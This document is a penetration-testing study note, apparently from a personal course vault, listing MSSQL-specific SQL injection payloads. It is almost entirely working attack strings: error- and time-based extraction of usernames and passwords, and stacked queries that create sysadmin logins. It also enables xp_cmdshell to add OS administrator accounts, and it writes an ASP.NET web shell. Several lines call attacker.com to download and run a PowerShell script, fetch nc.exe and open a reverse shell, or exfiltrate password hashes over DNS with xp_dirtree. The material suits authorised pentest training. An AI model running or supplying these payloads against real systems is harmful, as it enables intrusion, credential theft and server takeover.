---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.17 MSSQL Specific Payloads (xp_cmdshell, stacked queries)"
---

# 06.17 — MSSQL Specific Payloads

## MSSQL Detection

```sql
-- DETECT MSSQL:
-- MSSQL-specific functions:
SELECT @@version         → "Microsoft SQL Server 2019..."
SELECT @@SERVERNAME      → server name
SELECT DB_NAME()         → current database
SELECT SYSTEM_USER       → current user
SELECT IS_SRVROLEMEMBER('sysadmin')  → 1=yes, 0=no (am I admin?)

-- TIME-BASED (MSSQL):
'; WAITFOR DELAY '0:0:5'--    → 5 second delay = MSSQL!

-- ERROR-BASED (MSSQL):
' AND CONVERT(INT, @@version)--
-- Error: "Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int"

-- DISTINGUISH (vs MySQL SLEEP vs PostgreSQL pg_sleep):
?id=1; WAITFOR DELAY '0:0:5'--  → works = MSSQL
?id=1 AND SLEEP(5)--             → works = MySQL
'; SELECT pg_sleep(5)--          → works = PostgreSQL
```

---

## MSSQL Information Extraction

```sql
-- VERSION:
SELECT @@version
SELECT SERVERPROPERTY('ProductVersion')   -- just version number e.g. "15.0.2000.5"

-- CURRENT DB + USER:
SELECT DB_NAME()          -- current database
SELECT SYSTEM_USER        -- current login
SELECT USER               -- current user
SELECT ORIGINAL_LOGIN()   -- original login (if impersonation active)
SELECT SUSER_SNAME()      -- same as SYSTEM_USER

-- LIST ALL DATABASES:
SELECT name FROM master..sysdatabases
SELECT name FROM master.sys.databases

-- LIST ALL TABLES IN CURRENT DB:
SELECT name FROM sysobjects WHERE xtype='U'          -- user tables
SELECT name FROM sys.tables
SELECT table_name FROM information_schema.tables

-- LIST COLUMNS IN TABLE:
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- CHECK PRIVILEGES:
SELECT IS_SRVROLEMEMBER('sysadmin')    -- 1 = sysadmin!
SELECT IS_MEMBER('db_owner')           -- 1 = db_owner
SELECT HAS_DBACCESS('master')          -- access to master db?
EXEC xp_loginconfig                    -- login configuration

-- LIST ALL LOGINS:
SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G')
```

---

## MSSQL Data Extraction

```sql
-- CONCAT (MSSQL uses + not CONCAT):
SELECT username + ':' + password FROM users;
SELECT username + CHAR(58) + password FROM users;   -- CHAR(58)=':'

-- ALL ROWS AS COMMA-SEPARATED:
SELECT STUFF((SELECT ',' + username FROM users FOR XML PATH('')), 1, 1, '')
-- → "admin,alice,bob"

-- ALL WITH PASSWORDS:
SELECT STUFF((SELECT ',' + username + ':' + password FROM users FOR XML PATH('')), 1, 1, '')

-- PAGINATION (TOP/OFFSET):
SELECT TOP 1 username FROM users
SELECT TOP 1 username FROM users ORDER BY id
-- ROWS 2+:
SELECT TOP 1 username FROM users WHERE username NOT IN (SELECT TOP 1 username FROM users ORDER BY id) ORDER BY id

-- OFFSET (SQL Server 2012+):
SELECT username FROM users ORDER BY id OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
SELECT username FROM users ORDER BY id OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY
```

---

## MSSQL Error-Based

```sql
-- CONVERT/CAST ERROR:
' AND CONVERT(INT, @@version)--
' AND CAST(@@version AS INT)--
' AND CONVERT(INT, DB_NAME())--
' AND CONVERT(INT, (SELECT TOP 1 table_name FROM information_schema.tables))--
' AND CONVERT(INT, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
' AND CONVERT(INT, (SELECT TOP 1 username+':'+password FROM users))--

-- IIF (MSSQL 2012+):
' AND 1=IIF(1=1, CONVERT(INT,'a'), 1)--  -- conditional error

-- DIVISION BY ZERO:
' AND 1=(SELECT 1/0)--
-- Error: "Divide by zero error encountered"

-- SUBQUERY ERROR:
' AND 1=(SELECT 1 FROM (SELECT 1 UNION SELECT 2) x)--
-- Error: "Subquery returned more than 1 value"
-- This confirms injection (message shows the error from our subquery)
```

---

## MSSQL Time-Based

```sql
-- WAITFOR DELAY:
'; WAITFOR DELAY '0:0:5'--             -- 5 second delay (always)
'; IF (1=1) WAITFOR DELAY '0:0:5'--   -- conditional (same effect here)
'; IF (1=2) WAITFOR DELAY '0:0:5'--   -- no delay (false condition)

-- CONDITIONAL DATA EXTRACTION:
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:3'--
-- delay = first char of DB is 'm'!

'; IF (SUBSTRING(SYSTEM_USER,1,1)='s') WAITFOR DELAY '0:0:3'--
-- delay = first char of current user is 's'!

'; IF ((SELECT COUNT(*) FROM sysobjects WHERE name='users' AND xtype='U')=1) WAITFOR DELAY '0:0:3'--
-- delay = table 'users' exists!

'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username='admin'),1,1))>64) WAITFOR DELAY '0:0:3'--
-- binary search on password!

-- BENCHMARK ALTERNATIVE (CPU-based):
'; DECLARE @i INT = 0; WHILE @i < 1000000 BEGIN SET @i = @i + 1 END--
-- Causes CPU load, observable as delay
```

---

## MSSQL Stacked Queries

MSSQL almost always supports stacked queries (multiple statements with `;`).

```sql
-- CONFIRM STACKED:
'; SELECT 1--            → if returns 1 = stacked supported!
'; WAITFOR DELAY '0:0:3'-- → best confirmation (timing)

-- INSERT ADMIN USER:
'; INSERT INTO users (username,password,is_admin) VALUES ('hacker','hashed_pass',1)--

-- UPDATE ADMIN PASSWORD:
'; UPDATE users SET password='newhash' WHERE username='admin'--

-- CREATE DB USER (if sysadmin!):
'; EXEC sp_addlogin 'hacker','Password123!'--
'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--

-- ENABLE xp_cmdshell (if sysadmin):
'; EXEC sp_configure 'show advanced options', 1--
'; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1--
'; RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--
```

---

## xp_cmdshell — OS Command Execution!

`xp_cmdshell` is a built-in MSSQL stored procedure that executes OS commands. Disabled by default since SQL Server 2005 but can be re-enabled if the attacker has `sysadmin` privileges.

```sql
-- CHECK IF xp_cmdshell IS ENABLED:
'; EXEC xp_cmdshell 'whoami'--
-- If returns output → enabled!
-- If returns error about "Ole Automation" → not enabled

-- ENABLE xp_cmdshell (requires sysadmin):
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- EXECUTE COMMANDS:
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'ipconfig'--
'; EXEC xp_cmdshell 'net user'--
'; EXEC xp_cmdshell 'net user hacker Password123! /add'--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

-- CAPTURE OUTPUT:
'; CREATE TABLE #tmp (output VARCHAR(8000))--
'; INSERT INTO #tmp EXEC xp_cmdshell 'whoami'--
'; SELECT * FROM #tmp--
-- (need separate query to read output, use UNION)

-- REVERSE SHELL:
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")"'--

-- DOWNLOAD AND EXECUTE:
'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/nc.exe C:\Windows\Temp\nc.exe'--
'; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe attacker.com 4444'--
```

---

## MSSQL Out-of-Band via DNS

```sql
-- DNS LOOKUP (no extra privileges needed!):
'; EXEC master..xp_dirtree '\\attacker.com\x'--
-- → Triggers SMB connection + DNS lookup to attacker.com!

-- WITH DATA:
'; DECLARE @d VARCHAR(MAX);
SET @d = (SELECT TOP 1 password FROM users WHERE username='admin');
EXEC('master..xp_dirtree ''\\'+@d+'.attacker.com\x''')--
-- → DNS query: PASSWORD_HASH.attacker.com → captured!

-- OPENROWSET (if linked servers allowed):
'; SELECT * FROM OPENROWSET('SQLNCLI', 'server=attacker.com;uid=sa;pwd=;', 'SELECT 1')--
-- → Connection attempt to attacker.com:1433

-- UNC PATH:
'; EXEC xp_fileexist '\\attacker.com\x'--

-- BULK INSERT:
'; BULK INSERT tmp FROM '\\attacker.com\x\file.txt'--
```

---

## MSSQL File Read / Write

```sql
-- READ FILE (using BULK INSERT):
'; CREATE TABLE #filedata(data VARCHAR(8000))--
'; BULK INSERT #filedata FROM 'C:\Windows\win.ini'--
'; SELECT * FROM #filedata--

-- READ VIA xp_cmdshell:
'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--

-- WRITE FILE (via bcp or xp_cmdshell):
'; EXEC xp_cmdshell 'echo test > C:\inetpub\wwwroot\test.txt'--

-- WRITE WEBSHELL (ASP.NET):
'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<% Response.Write(System.Diagnostics.Process.Start("cmd","/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %^> > C:\inetpub\wwwroot\shell.aspx'--
```

---

## MSSQL Cheat Sheet Summary

```
DETECTION:   @@version, WAITFOR DELAY '0:0:5', CONVERT(INT,@@version)
DATABASES:   SELECT name FROM master..sysdatabases
TABLES:      SELECT name FROM sysobjects WHERE xtype='U'
COLUMNS:     SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
DATA:        SELECT TOP 1 username+':'+password FROM users
CONCAT:      username + ':' + password  (uses +, not ||)
TIME:        WAITFOR DELAY '0:0:5' / IF(cond) WAITFOR DELAY '0:0:5'
ERROR:       CONVERT(INT, data) / CAST(data AS INT)
STACKED:     ; any_statement; -- (almost always works in MSSQL)
RCE:         xp_cmdshell 'command' (requires sysadmin)
OOB/DNS:     xp_dirtree '\\attacker.com\x'
FILE:        BULK INSERT + xp_cmdshell
```

---

## Related Notes
- [[03 - Error-Based SQLi]] — CONVERT error technique
- [[06 - Blind SQLi Time-Based]] — WAITFOR DELAY
- [[07 - Out-of-Band SQLi]] — xp_dirtree OOB
- [[18 - Oracle Specific Payloads]] — Oracle comparison
